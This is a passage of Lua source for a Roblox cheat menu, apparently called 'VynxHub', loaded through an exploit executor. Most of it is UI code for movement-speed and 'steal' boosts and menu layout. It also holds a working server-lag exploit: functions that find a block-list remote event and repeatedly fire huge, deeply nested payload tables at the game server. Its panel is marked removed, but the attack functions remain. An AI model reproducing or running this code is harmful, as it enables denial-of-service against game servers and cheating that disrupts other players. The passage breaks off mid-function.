    row.Size = UDim2.new(1, -20, 0, 90)
    row.Position = UDim2.new(0, 10, 0, 44)
    row.BackgroundTransparency = 1
    row.ZIndex = 3
    row.Parent = card

    local function makeThumb(id, index)
        local thumb = Instance.new("ImageButton")
        thumb.Size = UDim2.new(0, 80, 0, 80)
        thumb.Position = UDim2.new(0, (index - 1) * 90, 0, 5)
        thumb.BackgroundColor3 = Color3.fromRGB(20, 24, 32)
        thumb.Image = "rbxassetid://" .. tostring(id)
        thumb.ScaleType = Enum.ScaleType.Crop
        thumb.ZIndex = 4
        thumb.AutoButtonColor = false
        thumb.Parent = row
        Instance.new("UICorner", thumb).CornerRadius = UDim.new(0, 10)
        local st = Instance.new("UIStroke", thumb)
        st.Color = ((M.accentColor and M.accentColor()) or Color3.fromRGB(0, 130, 200))
        st.Thickness = 2
        st.Transparency = (tonumber(id) == currentId) and 0.1 or 0.75
        thumb.MouseButton1Click:Connect(function()
            M.setPanelBgImageId(id)
            currentId = id
            for _, ch in ipairs(row:GetChildren()) do
                if ch:IsA("ImageButton") then
                    local s = ch:FindFirstChildOfClass("UIStroke")
                    if s then s.Transparency = 0.75 end
                end
            end
            st.Transparency = 0.1
        end)
        return thumb
    end

    for i, id in ipairs(ids) do
        makeThumb(id, i)
    end

    local off = Instance.new("TextButton")
    off.Size = UDim2.new(0, 70, 0, 28)
    off.Position = UDim2.new(0, 10, 1, -40)
    off.BackgroundColor3 = Color3.fromRGB(28, 32, 40)
    off.Text = "OFF"
    off.TextColor3 = Color3.fromRGB(200, 200, 210)
    off.Font = Enum.Font.GothamBold
    off.TextSize = 12
    off.ZIndex = 4
    off.AutoButtonColor = false
    off.Parent = card
    Instance.new("UICorner", off).CornerRadius = UDim.new(0, 8)
    off.MouseButton1Click:Connect(function()
        M.setPanelBgImageId(0)
        gui:Destroy()
    end)

    local close = Instance.new("TextButton")
    close.Size = UDim2.new(0, 70, 0, 28)
    close.Position = UDim2.new(1, -80, 1, -40)
    close.BackgroundColor3 = ((M.accentColor and M.accentColor()) or Color3.fromRGB(0, 130, 200))
    close.Text = "DONE"
    close.TextColor3 = Color3.fromRGB(255, 255, 255)
    close.Font = Enum.Font.GothamBlack
    close.TextSize = 12
    close.ZIndex = 4
    close.AutoButtonColor = false
    close.Parent = card
    Instance.new("UICorner", close).CornerRadius = UDim.new(0, 8)
    close.MouseButton1Click:Connect(function() gui:Destroy() end)
end

local function xrayPingResolveKb(name)
    if not name or name == "" or name == "None" then return nil end
    local ok, val = pcall(function() return Enum.KeyCode[name] end)
    return (ok and val) or nil
end

local function xrayPingIsGamepad(kc)
    if not kc then return false end
    local n = kc.Name
    return n:sub(1,6)=="Button" or n:sub(1,10)=="Thumbstick"
        or n:sub(1,4)=="DPad" or n=="ButtonSelect" or n=="ButtonStart"
end

function M.findPingRemote()
    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
    if not rrs then return nil end
    local remote
    for _, name in ipairs({"SetPlayerBlockList","UpdatePlayerBlockList","SetBlockList","UpdateBlockList"}) do
        local r = rrs:FindFirstChild(name)
        if r and (r:IsA("RemoteEvent") or r:IsA("UnreliableRemoteEvent") or r:IsA("RemoteFunction")) then
            remote = r; break
        end
    end
    if not remote then
        for _, c in ipairs(rrs:GetChildren()) do
            if (c:IsA("RemoteEvent") or c:IsA("UnreliableRemoteEvent") or c:IsA("RemoteFunction")) and c.Name:find("Block") then
                remote = c; break
            end
        end
    end
    return remote
end

function M.buildPingPayload(power)
    local main = {}
    local nested = {{}}
    local current = nested[1]
    for _ = 1, 186 do
        local n = {}
        table.insert(current, n)
        current = n
    end
    local maxRep = math.min(math.floor((tonumber(power) or 100000) / 188), 10000)
    for _ = 1, maxRep do
        table.insert(main, nested)
    end
    return main
end

function M.runPingLoop()
    if M.pingLoopRunning then return end
    M.pingLoopRunning = true
    local delay = tonumber(M.pingInterval) or 0.125
    while M.pingActive and M.pingPanelOpen and M.pingRemote do
        local payload = M.buildPingPayload(M.pingPower)
        local ok = pcall(function()
            if M.pingRemote:IsA("RemoteFunction") then
                M.pingRemote:InvokeServer(payload)
            else
                M.pingRemote:FireServer(payload)
            end
        end)
        if not ok then
            delay = math.min(delay * 1.5, 0.5)
        else
            delay = math.max(delay * 0.995, 0.05)
        end
        task.wait(delay)
    end
    M.pingLoopRunning = false
end

function M.setPingActive(state, isManual)
    if state and not M.pingPanelOpen then
        M.pingActive = false
        if M._pingRefreshVisual then pcall(M._pingRefreshVisual) end
        return
    end
    M.pingActive = state and true or false
    if isManual then
        if M.pingBrainrotMode then
            M.pingManualOverride = not state
        else
            M.pingManualOverride = false
        end
    end
    if M.pingActive then
        if not M.pingRemote then
            M.pingRemote = M.findPingRemote()
            if not M.pingRemote then
                M.pingActive = false
            end
        end
        if M.pingActive and not M.pingLoopRunning then
            task.spawn(M.runPingLoop)
        end
    end
    if M._pingRefreshVisual then
        pcall(M._pingRefreshVisual)
    end
end


function M.buildPingLaggerUI()
    -- Ping Lagger panel removed
    pcall(function()
        if M.pingGui then M.pingGui:Destroy() end
    end)
    M.pingGui = nil
    M.pingMain = nil
    M.pingSettings = nil
    M.pingPanelOpen = false
end

function M.setPingPanelOpen(on)
    -- Ping Lagger panel removed; always keep closed
    M.pingPanelOpen = false
    pcall(function()
        if M.pingGui then M.pingGui:Destroy() end
    end)
    M.pingGui = nil
    M.pingMain = nil
    if M.setPingPanelVisual then
        pcall(function() M.setPingPanelVisual(false) end)
    end
end

function M.resetSpeedBoosterPosition()
    M.speedBoosterPos = nil
    if M.speedBoosterMain then
        M.speedBoosterMain.Position = UDim2.new(0, 20, 0.35, 0)
    end
    pcall(saveCherryConfig)
end

function M.buildSpeedBoosterUI()
    if M.speedBoosterGui then
        pcall(function() M.speedBoosterGui:Destroy() end)
        M.speedBoosterGui = nil
        M.speedBoosterMain = nil
    end

    local ACCENT = (M.Theme and M.Theme.Accent) or M.UI_ACCENT or UI_ACCENT or Color3.fromRGB(0, 255, 194)
    local gui = Instance.new("ScreenGui")
    gui.Name = "VynxSpeedBooster"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.DisplayOrder = 45
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    pcall(function()
        if gethui then gui.Parent = gethui() else gui.Parent = game:GetService("CoreGui") end
    end)
    if not gui.Parent then gui.Parent = player:WaitForChild("PlayerGui") end
    M.speedBoosterGui = gui

    local main = Instance.new("Frame")
    main.Name = "Main"
    main.Size = UDim2.new(0, 168, 0, 168)
    if type(M.speedBoosterPos) == "table" then
        local p = M.speedBoosterPos
        main.Position = UDim2.new(p[1] or 0, p[2] or 20, p[3] or 0.35, p[4] or 0)
    else
        main.Position = UDim2.new(0, 20, 0.35, 0)
    end
    main.BackgroundColor3 = Color3.fromRGB(12, 14, 18)
    main.BackgroundTransparency = 0.04
    main.BorderSizePixel = 0
    main.Active = true
    main.ClipsDescendants = true
    main.Visible = (M.speedUIMode or "Original") ~= "Original" and (M.speedBoosterPanelOpen ~= false)
    main.Parent = gui
    Instance.new("UICorner", main).CornerRadius = UDim.new(0, 10)
    local st = Instance.new("UIStroke"); st.Color = ACCENT; st.Thickness = 1.2; st.Transparency = 0.4; st.Parent = main
    M.speedBoosterMain = main

    local header = Instance.new("Frame")
    header.Size = UDim2.new(1, 0, 0, 26)
    header.BackgroundTransparency = 1
    header.Active = true
    header.Parent = main

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, -28, 1, 0)
    title.Position = UDim2.new(0, 8, 0, 0)
    title.BackgroundTransparency = 1
    title.Text = "Speed"
    title.TextColor3 = ACCENT
    title.Font = Enum.Font.GothamBold
    title.TextSize = 11
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.Parent = header

    local closeBtn = Instance.new("TextButton")
    closeBtn.Size = UDim2.new(0, 20, 0, 20)
    closeBtn.Position = UDim2.new(1, -24, 0.5, -10)
    closeBtn.BackgroundColor3 = Color3.fromRGB(22, 24, 30)
    closeBtn.BorderSizePixel = 0
    closeBtn.Text = "x"
    closeBtn.TextColor3 = ACCENT
    closeBtn.Font = Enum.Font.GothamBold
    closeBtn.TextSize = 11
    closeBtn.AutoButtonColor = false
    closeBtn.Parent = header
    Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 5)

    do
        local dragging, dragStart, startPos
        header.InputBegan:Connect(function(input)
            if M.uiLocked then return end
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragging = true
                dragStart = input.Position
                startPos = main.Position
                input.Changed:Connect(function()
                    if input.UserInputState == Enum.UserInputState.End then
                        dragging = false
                        M.speedBoosterPos = {main.Position.X.Scale, main.Position.X.Offset, main.Position.Y.Scale, main.Position.Y.Offset}
                        pcall(saveCherryConfig)
                    end
                end)
            end
        end)
        UIS.InputChanged:Connect(function(input)
            if not dragging or M.uiLocked then return end
            if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
                local d = input.Position - dragStart
                main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
            end
        end)
    end
    closeBtn.MouseButton1Click:Connect(function()
        M.speedBoosterPanelOpen = false
        main.Visible = false
        pcall(saveCherryConfig)
    end)

    local body = Instance.new("Frame")
    body.Size = UDim2.new(1, -12, 1, -32)
    body.Position = UDim2.new(0, 6, 0, 28)
    body.BackgroundTransparency = 1
    body.Parent = main

    local path = (tostring(M.speedBoosterPath) == "Lagger") and "Lagger" or "Normal"
    M.speedBoosterPath = path

    local seg = Instance.new("Frame")
    seg.Size = UDim2.new(1, 0, 0, 24)
    seg.BackgroundColor3 = Color3.fromRGB(18, 20, 26)
    seg.BorderSizePixel = 0
    seg.Parent = body
    Instance.new("UICorner", seg).CornerRadius = UDim.new(0, 7)

    local normalBtn = Instance.new("TextButton")
    normalBtn.Size = UDim2.new(0.5, -3, 1, -4)
    normalBtn.Position = UDim2.new(0, 2, 0, 2)
    normalBtn.BorderSizePixel = 0
    normalBtn.Text = "NORMAL"
    normalBtn.Font = Enum.Font.GothamBold
    normalBtn.TextSize = 9
    normalBtn.AutoButtonColor = false
    normalBtn.Parent = seg
    Instance.new("UICorner", normalBtn).CornerRadius = UDim.new(0, 6)

    local laggerBtn = Instance.new("TextButton")
    laggerBtn.Size = UDim2.new(0.5, -3, 1, -4)
    laggerBtn.Position = UDim2.new(0.5, 1, 0, 2)
    laggerBtn.BorderSizePixel = 0
    laggerBtn.Text = "LAGGER"
    laggerBtn.Font = Enum.Font.GothamBold
    laggerBtn.TextSize = 9
    laggerBtn.AutoButtonColor = false
    laggerBtn.Parent = seg
    Instance.new("UICorner", laggerBtn).CornerRadius = UDim.new(0, 6)

    local function paintSeg()
        if path == "Normal" then
            normalBtn.BackgroundColor3 = ACCENT; normalBtn.TextColor3 = Color3.fromRGB(10,12,14)
            laggerBtn.BackgroundColor3 = Color3.fromRGB(22,24,30); laggerBtn.TextColor3 = ACCENT
        else
            laggerBtn.BackgroundColor3 = ACCENT; laggerBtn.TextColor3 = Color3.fromRGB(10,12,14)
            normalBtn.BackgroundColor3 = Color3.fromRGB(22,24,30); normalBtn.TextColor3 = ACCENT
        end
    end
    paintSeg()

    local function makeValueRow(y, labelText)
        local row = Instance.new("Frame")
        row.Size = UDim2.new(1, 0, 0, 26)
        row.Position = UDim2.new(0, 0, 0, y)
        row.BackgroundColor3 = Color3.fromRGB(18, 20, 26)
        row.BorderSizePixel = 0
        row.Parent = body
        Instance.new("UICorner", row).CornerRadius = UDim.new(0, 7)
        local lbl = Instance.new("TextLabel")
        lbl.Size = UDim2.new(0.48, 0, 1, 0)
        lbl.Position = UDim2.new(0, 8, 0, 0)
        lbl.BackgroundTransparency = 1
        lbl.Text = labelText
        lbl.TextColor3 = ACCENT
        lbl.Font = Enum.Font.GothamBold
        lbl.TextSize = 10
        lbl.TextXAlignment = Enum.TextXAlignment.Left
        lbl.Parent = row
        return row
    end

    local statusRow = makeValueRow(30, "Status")
    local statusBtn = Instance.new("TextButton")
    statusBtn.Size = UDim2.new(0, 44, 0, 18)
    statusBtn.Position = UDim2.new(1, -50, 0.5, -9)
    statusBtn.BorderSizePixel = 0
    statusBtn.Font = Enum.Font.GothamBold
    statusBtn.TextSize = 9
    statusBtn.AutoButtonColor = false
    statusBtn.Parent = statusRow
    Instance.new("UICorner", statusBtn).CornerRadius = UDim.new(0, 6)

    local function paintStatus()
        local on = M.speedBoosterEnabled ~= false
        statusBtn.Text = on and "ON" or "OFF"
        if on then statusBtn.BackgroundColor3 = ACCENT; statusBtn.TextColor3 = Color3.fromRGB(10,12,14)
        else statusBtn.BackgroundColor3 = Color3.fromRGB(30,32,38); statusBtn.TextColor3 = Color3.fromRGB(171, 171, 186) end
    end
    paintStatus()
    statusBtn.MouseButton1Click:Connect(function()
        M.speedBoosterEnabled = not (M.speedBoosterEnabled ~= false)
        paintStatus()
        if M.refreshSpeedModeLabel then M.refreshSpeedModeLabel() end
        pcall(saveCherryConfig)
    end)

    local speedRow = makeValueRow(60, "Speed")
    local speedBox = Instance.new("TextBox")
    speedBox.Size = UDim2.new(0, 48, 0, 18)
    speedBox.Position = UDim2.new(1, -54, 0.5, -9)
    speedBox.BackgroundColor3 = Color3.fromRGB(10, 12, 16)
    speedBox.BorderSizePixel = 0
    speedBox.TextColor3 = ACCENT
    speedBox.Font = Enum.Font.GothamBold
    speedBox.TextSize = 10
    speedBox.ClearTextOnFocus = false
    speedBox.Parent = speedRow
    Instance.new("UICorner", speedBox).CornerRadius = UDim.new(0, 6)

    local stealRow = makeValueRow(90, "Steal")
    local stealBox = Instance.new("TextBox")
    stealBox.Size = UDim2.new(0, 48, 0, 18)
    stealBox.Position = UDim2.new(1, -54, 0.5, -9)
    stealBox.BackgroundColor3 = Color3.fromRGB(10, 12, 16)
    stealBox.BorderSizePixel = 0
    stealBox.TextColor3 = ACCENT
    stealBox.Font = Enum.Font.GothamBold
    stealBox.TextSize = 10
    stealBox.ClearTextOnFocus = false
    stealBox.Parent = stealRow
    Instance.new("UICorner", stealBox).CornerRadius = UDim.new(0, 6)

    local function refreshBoxes()
        if path == "Lagger" then
            speedBox.Text = tostring(M.LAGGER_SPEED)
            stealBox.Text = tostring(M.LAGGER_CARRY_SPEED)
        else
            speedBox.Text = tostring(M.NS)
            stealBox.Text = tostring(M.CS)
        end
    end
    refreshBoxes()

    local function applyPath(forcePath, fromSync)
        if forcePath == "Lagger" or forcePath == "Normal" then
            path = forcePath
        end
        M.speedBoosterPath = path
        M.speedBoosterEnabled = true
        if not fromSync then
            if paintStatus then paintStatus() end
        end

        M.carrySpeedActive = false
        M.laggerCarryActive = false
        M.laggerModeEnabled = (path == "Lagger")
        if M.laggerModeBtn then M.laggerModeBtn.Text = M.laggerModeEnabled and "Lag On" or "Lag Off" end
        if M.laggerCarryBtn then M.laggerCarryBtn.Text = M.laggerCarryActive and "L.Carry On" or "L.Carry Off" end
        if M.carryModeBtn then M.carryModeBtn.Text = M.carrySpeedActive and "Carry On" or "Carry Off" end
        if M.mobBtnRefs.lagger then pcall(function() M.mobBtnRefs.lagger(M.laggerModeEnabled) end) end
        if M.mobBtnRefs.laggerCarry then pcall(function() M.mobBtnRefs.laggerCarry(M.laggerCarryActive) end) end
        if M.mobBtnRefs.carrySpeed then pcall(function() M.mobBtnRefs.carrySpeed(M.carrySpeedActive) end) end
        if M.refreshSpeedModeLabel then M.refreshSpeedModeLabel() end
        refreshBoxes(); paintSeg()
        if not fromSync then pcall(saveCherryConfig) end
    end

    M.speedBoosterSyncPath = function(newPath)
        if newPath ~= "Lagger" and newPath ~= "Normal" then return end
        path = newPath
        M.speedBoosterPath = path
        paintSeg()
        refreshBoxes()
    end

    normalBtn.MouseButton1Click:Connect(function() applyPath("Normal") end)
    laggerBtn.MouseButton1Click:Connect(function() applyPath("Lagger") end)
    speedBox.FocusLost:Connect(function()
        local n = tonumber(speedBox.Text)
        if n and n >= 1 and n <= 500 then
            if path == "Lagger" then M.LAGGER_SPEED = n else M.NS = n end
            speedBox.Text = tostring(n); pcall(saveCherryConfig)
        else refreshBoxes() end
    end)
    stealBox.FocusLost:Connect(function()
        local n = tonumber(stealBox.Text)
        if n and n >= 1 and n <= 500 then
            if path == "Lagger" then M.LAGGER_CARRY_SPEED = n else M.CS = n end
            stealBox.Text = tostring(n); pcall(saveCherryConfig)
        else refreshBoxes() end
    end)

    local resetBtn = Instance.new("TextButton")
    resetBtn.Size = UDim2.new(1, 0, 0, 22)
    resetBtn.Position = UDim2.new(0, 0, 0, 120)
    resetBtn.BackgroundColor3 = Color3.fromRGB(22, 24, 30)
    resetBtn.BorderSizePixel = 0
    resetBtn.Text = "RESET POS"
    resetBtn.TextColor3 = ACCENT
    resetBtn.Font = Enum.Font.GothamBold
    resetBtn.TextSize = 9
    resetBtn.AutoButtonColor = false
    resetBtn.Parent = body
    Instance.new("UICorner", resetBtn).CornerRadius = UDim.new(0, 6)
    resetBtn.MouseButton1Click:Connect(function() M.resetSpeedBoosterPosition() end)

    M.normalBox = speedBox; M.carryBox = stealBox; M.laggerBox = speedBox
    M.speedBoosterRefresh = refreshBoxes
    M.speedBoosterPaintStatus = paintStatus
    M.speedBoosterApplyPath = applyPath
    applyPath(path, true)
end

function M.setSpeedBoosterPanelOpen(on)
    M.speedBoosterPanelOpen = on and true or false
    if not M.speedBoosterMain then pcall(M.buildSpeedBoosterUI) end
    if M.speedBoosterMain then
        local show = M.speedBoosterPanelOpen and (M.speedUIMode or "Original") ~= "Original"
        M.speedBoosterMain.Visible = show
    end
    pcall(saveCherryConfig)
end

function M.buildGui()
    -- Never hard-block UI forever on intro; allow build after first attempt
    if M._introUIReady == false and M._bootBuildAttempts == nil then
        M._bootBuildAttempts = 1
        M._pendingBuildGui = true
        -- still proceed so menu is not blank
    end
    M._introUIReady = true
    if M._buildingGui then return end
    M._buildingGui = true
    M.uiLocked = false
    M.menuOpen = true
    pcall(function() applyAccentFromTheme() end)
    pcall(function() M.clearPersistentConns() end)

    local _killNames = {"MoveeDuels","Cherry_Menu","K7HubGUI","VantaHubUI","VynxHubUI","AceDuelsAdaptReconstruct","VynxStatusUI","VynxTopBanner"}
    local function _killGui(parent)
        if not parent then return end
        for _, n in ipairs(_killNames) do
            local o = parent:FindFirstChild(n)
            if o then pcall(function() o:Destroy() end) end
        end
    end
    pcall(function() _killGui(game:GetService("CoreGui")) end)
    pcall(function() _killGui(player:FindFirstChild("PlayerGui")) end)
    pcall(function() if gethui then _killGui(gethui()) end end)
    if M.gui and M.gui.Parent then pcall(function() M.gui:Destroy() end) end
    M.gui = nil
    M.mainFrame = nil

    M.buildStatusUI()
    pcall(function() if M.topBannerGui then M.topBannerGui:Destroy() end; M.topBannerGui=nil end)

    local gui = Instance.new("ScreenGui")
    gui.Name = "VynxHubUI"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    do
        local ok = false
        if gethui then ok = pcall(function() gui.Parent = gethui() end) end
        if not ok then ok = pcall(function() gui.Parent = game:GetService("CoreGui") end) end
        if not ok then gui.Parent = player:WaitForChild("PlayerGui") end
    end
    M.gui = gui


function M.applyUiLayout(mode)
    -- only top bar tabs (no side selector)
    mode = "Vertical Top"
    M.uiLayoutMode = mode
    local Frame = M.mainFrame
    local ContentRoot = Frame and Frame:FindFirstChild("ContentRoot")
    local CategoryBar = M.categoryBar
    local masterScroll = M.allPageScroll
    local Header = Frame and Frame:FindFirstChild("Header")
    if not (Frame and ContentRoot and CategoryBar and masterScroll) then return end

    local MAIN_W = Frame.Size.X.Offset > 0 and Frame.Size.X.Offset or 400
    local MAIN_H = Frame.Size.Y.Offset > 0 and Frame.Size.Y.Offset or 520
    local HEADER_H = (Header and Header.Size.Y.Offset) or 78
    local SIDE_W = 108
    local TOP_TAB_H = 46

    local CatBarLayout = CategoryBar:FindFirstChildOfClass("UIListLayout")
    local CatBarPad = CategoryBar:FindFirstChildOfClass("UIPadding")

    local function restyleTabs(horizontal)
        if CatBarLayout then
            CatBarLayout.FillDirection = horizontal and Enum.FillDirection.Horizontal or Enum.FillDirection.Vertical
            CatBarLayout.HorizontalAlignment = horizontal and Enum.HorizontalAlignment.Left or Enum.HorizontalAlignment.Center
            CatBarLayout.Padding = UDim.new(0, 0)
        end
        if CatBarPad then
            if horizontal then
                CatBarPad.PaddingTop = UDim.new(0, 4)
                CatBarPad.PaddingLeft = UDim.new(0, 8)
                CatBarPad.PaddingRight = UDim.new(0, 8)
                CatBarPad.PaddingBottom = UDim.new(0, 4)
            else
                CatBarPad.PaddingTop = UDim.new(0, 4)
                CatBarPad.PaddingLeft = UDim.new(0, 8)
                CatBarPad.PaddingRight = UDim.new(0, 8)
                CatBarPad.PaddingBottom = UDim.new(0, 4)
            end
        end
        local menuLbl = CategoryBar:FindFirstChild("TextLabel") or CategoryBar:FindFirstChildWhichIsA("TextLabel")
        if menuLbl then menuLbl.Visible = false end
        for _, btn in pairs(M.tabButtonRefs or {}) do
            if btn and btn.Parent then
                btn.TextSize = horizontal and 12 or 13
            end
        end
        if M.fitTabs then pcall(M.fitTabs) end
    end

    local dragStrip = ContentRoot:FindFirstChild("RightDragStrip")
    local aceVert = ContentRoot:FindFirstChild("AceVerticalScript")

    if mode == "Sidecar Left" then
        restyleTabs(false)
        CategoryBar.Visible = true
        CategoryBar.Size = UDim2.new(0, SIDE_W, 1, -(HEADER_H + 12))
        CategoryBar.Position = UDim2.new(0, 10, 0, HEADER_H + 6)
        CategoryBar.ScrollingEnabled = false
        CategoryBar.CanvasSize = UDim2.new(0, 0, 0, 0)
        masterScroll.Position = UDim2.new(0, SIDE_W + 20, 0, HEADER_H + 4)
        masterScroll.Size = UDim2.new(1, -(SIDE_W + 30), 1, -(HEADER_H + 16))
        if dragStrip then
            dragStrip.Position = UDim2.new(0, 6, 0, HEADER_H + 10)
            dragStrip.Visible = true
        end
        if aceVert then
            aceVert.Position = UDim2.new(0, SIDE_W + 14, 0, HEADER_H + 100)
            aceVert.Visible = true
        end
    elseif mode == "Vertical Top" then
        restyleTabs(true)
        CategoryBar.Visible = true
        CategoryBar.Size = UDim2.new(1, -20, 0, TOP_TAB_H)
        CategoryBar.Position = UDim2.new(0, 10, 0, HEADER_H + 4)
        masterScroll.Position = UDim2.new(0, 10, 0, HEADER_H + TOP_TAB_H + 10)
        masterScroll.Size = UDim2.new(1, -20, 1, -(HEADER_H + TOP_TAB_H + 18))
        CategoryBar.ScrollingEnabled = false
        CategoryBar.CanvasSize = UDim2.new(0, 0, 0, 0)
        if dragStrip then dragStrip.Visible = false end
        if aceVert then aceVert.Visible = false end
    elseif mode == "Vertical Bottom" then
        restyleTabs(true)
        CategoryBar.Visible = true
        CategoryBar.Size = UDim2.new(1, -20, 0, TOP_TAB_H)
        CategoryBar.Position = UDim2.new(0, 10, 1, -(TOP_TAB_H + 10))
        masterScroll.Position = UDim2.new(0, 10, 0, HEADER_H + 4)
        masterScroll.Size = UDim2.new(1, -20, 1, -(HEADER_H + TOP_TAB_H + 18))
        CategoryBar.ScrollingEnabled = false
        CategoryBar.CanvasSize = UDim2.new(0, 0, 0, 0)
        if dragStrip then dragStrip.Visible = false end
        if aceVert then aceVert.Visible = false end
    else
        restyleTabs(false)
        CategoryBar.Visible = true
        CategoryBar.Size = UDim2.new(0, SIDE_W, 1, -(HEADER_H + 12))
        CategoryBar.Position = UDim2.new(1, -SIDE_W - 10, 0, HEADER_H + 6)
        CategoryBar.ScrollingEnabled = false
        CategoryBar.CanvasSize = UDim2.new(0, 0, 0, 0)
        masterScroll.Position = UDim2.new(0, 10, 0, HEADER_H + 4)
        masterScroll.Size = UDim2.new(1, -20, 1, -(HEADER_H + 56))
        if dragStrip then
            dragStrip.Position = UDim2.new(1, -10, 0, HEADER_H + 10)
            dragStrip.Visible = true
        end
        if aceVert then
            aceVert.Position = UDim2.new(1, -SIDE_W - 32, 0, HEADER_H + 100)
            aceVert.Visible = true
        end
    end

    if M.fitTabs then pcall(M.fitTabs) end
    if M.styleTab and M._currentTabName and M.tabButtonRefs then
        pcall(function()
            local tb = M.tabButtonRefs[M._currentTabName]
            if tb then M.styleTab(tb, true) end
        end)
    end
    if M.uiLayoutLabel then pcall(function() M.uiLayoutLabel.Text = mode end) end
    pcall(function() if saveCherryConfig then saveCherryConfig() end end)
end

function M.cycleUiLayout(direction)
    direction = direction or 1
    local order = M.UI_LAYOUT_ORDER or {"Vertical Top"}
    local idx = 1
    for i, name in ipairs(order) do
        if name == M.uiLayoutMode then idx = i break end
    end
    local n = idx + direction
    if n < 1 then n = #order end
    if n > #order then n = 1 end
    M.applyUiLayout(order[n])
end

    local MAIN_W, MAIN_H = 340, 500
    local HEADER_H = 64
    local CAT_BAR_H = 40
    local SIDE_W = 0

    local Frame = Instance.new("Frame")
    Frame.Name = "Frame"
    Frame.ClipsDescendants = true
    Frame.AnchorPoint = Vector2.new(0, 0)

    Frame.Position = UDim2.new(0, 14, 0, 10)
    Frame.Size = UDim2.new(0, MAIN_W, 0, MAIN_H)

    Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    Frame.BackgroundTransparency = 0
    Frame.BorderSizePixel = 0
    Frame.Active = true
    Frame.Parent = gui
    M.mainFrame = Frame

    local UIScale = Instance.new("UIScale")
    UIScale.Name = "BDUIScale"
    UIScale.Scale = tonumber(M.uiScale) or 0.6
    UIScale.Parent = Frame
    M.uiScaleRef = UIScale

    Instance.new("UICorner", Frame).CornerRadius = UDim.new(0, 22)
    do
        local stroke = Instance.new("UIStroke")
        stroke.Name = "MainStroke"
        stroke.Color = Color3.fromRGB(30, 120, 220)
        stroke.Thickness = 1.6
        stroke.Transparency = 0.25
        stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
        stroke.Parent = Frame
    end

    do
        local ov = Instance.new("Frame")
        ov.Name = "CoachOverlay"
        ov.Size = UDim2.new(1, 0, 1, 0)
        ov.BackgroundTransparency = 1
        ov.BorderSizePixel = 0
        ov.ZIndex = 1
        ov.Parent = Frame
        Instance.new("UICorner", ov).CornerRadius = UDim.new(0, 32)
    end

    local LeftPanel = Instance.new("Frame")
    LeftPanel.Name = "LeftImagePanel"
    LeftPanel.Size = UDim2.new(1, 0, 1, 0)
    LeftPanel.BackgroundTransparency = 1
    LeftPanel.BorderSizePixel = 0
    LeftPanel.ClipsDescendants = true
    LeftPanel.ZIndex = 1
    LeftPanel.Parent = Frame
    Instance.new("UICorner", LeftPanel).CornerRadius = UDim.new(0, 28)
    M.leftImagePanel = LeftPanel
    M.customBgId = tonumber(M.MENU_BG_ASSET) or 73023682914801
    M.customBgKey = nil
    M.customBgOpacity = 0.02
    M.applyCustomBackground(Frame)

do
    M._menuBumpInteract = function() end
    task.defer(function()
        if not M.mainFrame then return end
        local ov = M.mainFrame:FindFirstChild("IdleDimOverlay")
        if ov then pcall(function() ov:Destroy() end) end
    end)
end


    local ContentRoot = Instance.new("Frame")
    ContentRoot.Name = "ContentRoot"
    ContentRoot.Size = UDim2.new(1, 0, 1, 0)
    ContentRoot.BackgroundTransparency = 1
    ContentRoot.BorderSizePixel = 0
    ContentRoot.ClipsDescendants = true
    ContentRoot.ZIndex = 2
    ContentRoot.Parent = Frame
    Instance.new("UICorner", ContentRoot).CornerRadius = UDim.new(0, 22)
    M.contentRoot = ContentRoot

    local Header = Instance.new("Frame")
    Header.Name = "HeaderPanel"
    Header.Size = UDim2.new(1, 0, 0, HEADER_H)
    Header.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    Header.BackgroundTransparency = 0.05
    Header.BorderSizePixel = 0
    Header.Active = true
    Header.ClipsDescendants = false
    Header.ZIndex = 20
    Header.Parent = ContentRoot
    M.headerPanel = Header
    Instance.new("UICorner", Header).CornerRadius = UDim.new(0, 18)
    do
        local line = Instance.new("Frame")
        line.Name = "HeaderBottomLine"
        line.Size = UDim2.new(1, -24, 0, 1)
        line.Position = UDim2.new(0, 12, 1, -1)
        line.BackgroundColor3 = Color3.fromRGB(55, 55, 62)
        line.BackgroundTransparency = 0.35
        line.BorderSizePixel = 0
        line.ZIndex = 21
        line.Parent = Header
    end

    do
        local fade = Instance.new("Frame")
        fade.Name = "HeaderFade"
        fade.Size = UDim2.new(1, 0, 0, 28)
        fade.Position = UDim2.new(0, 0, 1, -28)
        fade.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        fade.BackgroundTransparency = 1
        fade.BorderSizePixel = 0
        fade.ZIndex = 5
        fade.Parent = Header
        local g = Instance.new("UIGradient")
        g.Rotation = 90
        g.Transparency = NumberSequence.new({
            NumberSequenceKeypoint.new(0, 1),
            NumberSequenceKeypoint.new(1, 0.2),
        })
        g.Parent = fade
    end

    local logo = Instance.new("Frame")
    logo.Name = "VHLogo"
    logo.Size = UDim2.new(0, 48, 0, 48)
    logo.Position = UDim2.new(0, 6, 0, 8)
    logo.BackgroundTransparency = 1
    logo.BorderSizePixel = 0
    logo.ZIndex = 51
    logo.Parent = Header
    -- no square contour / no stroke — only VH letters

    local logoV = Instance.new("TextLabel", logo)
    logoV.Name = "LogoV"
    logoV.Size = UDim2.new(0.52, 0, 1, 0)
    logoV.Position = UDim2.new(0, 0, 0, 0)
    logoV.BackgroundTransparency = 1
    logoV.Text = "V"
    logoV.TextColor3 = Color3.fromRGB(90, 185, 255)
    logoV.Font = Enum.Font.GothamBlack
    logoV.TextSize = 28
    logoV.TextStrokeTransparency = 0.7
    logoV.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    logoV.TextXAlignment = Enum.TextXAlignment.Right
    logoV.ZIndex = 53

    local logoH = Instance.new("TextLabel", logo)
